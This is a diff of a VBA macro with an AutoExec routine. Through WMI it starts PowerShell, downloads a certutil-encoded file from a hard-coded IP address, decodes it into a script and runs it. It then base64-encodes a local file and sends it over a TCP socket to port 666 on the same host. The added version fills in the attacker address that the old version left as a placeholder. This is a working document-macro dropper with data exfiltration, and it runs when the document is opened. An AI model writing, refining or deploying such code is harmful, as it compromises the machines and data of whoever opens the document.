@@ -1,5 +1,5 @@
 Sub AutoExec()
-Set Wmi = GetObject("winmgmts:\\.\root\cimv2")
+    Set Wmi = GetObject("winmgmts:\\.\root\cimv2")
     Set Proc = Wmi.Get("Win32_Process")
-    Proc.Create ("Powershell.exe -NoExit $source = '<SERVER IP>/CERT.crt'; $destination = 'C:\Users\Public\CERT.crt'; Invoke-WebRequest -Uri $source -OutFile $destination; cd C:\Users\Public; certutil -decode CERT.crt test.ps1; .\test.ps1; certutil -encode test.txt passwordcert.crt; $test = [System.Convert]::ToBAse64String([io.file]::ReadAllBytes('C:\Users\Public\passwordCert.crt'));$socket = New-Object net.sockets.tcpclient('209.151.148.97',666); $stream = $socket.GetStream(); $writer = new-object System.IO.StreamWriter($stream); $buffer = new-object System.Byte[] 1024; $writer.WriteLine($test); $socket.close()")
+    Proc.Create ("Powershell.exe -NoExit $source = '209.151.148.97/CERT.crt'; $destination = 'C:\Users\Public\CERT.crt'; Invoke-WebRequest -Uri $source -OutFile $destination; cd C:\Users\Public; certutil -decode CERT.crt test.ps1; .\test.ps1; $test = [System.Convert]::ToBase64String([io.file]::ReadAllBytes('C:\Users\Public\test.txt'));$socket = New-Object net.sockets.tcpclient('209.151.148.97',666); $stream = $socket.GetStream(); $writer = new-object System.IO.StreamWriter($stream); $buffer = new-object System.Byte[] 1024; $writer.WriteLine($test); $socket.close()")
 End Sub
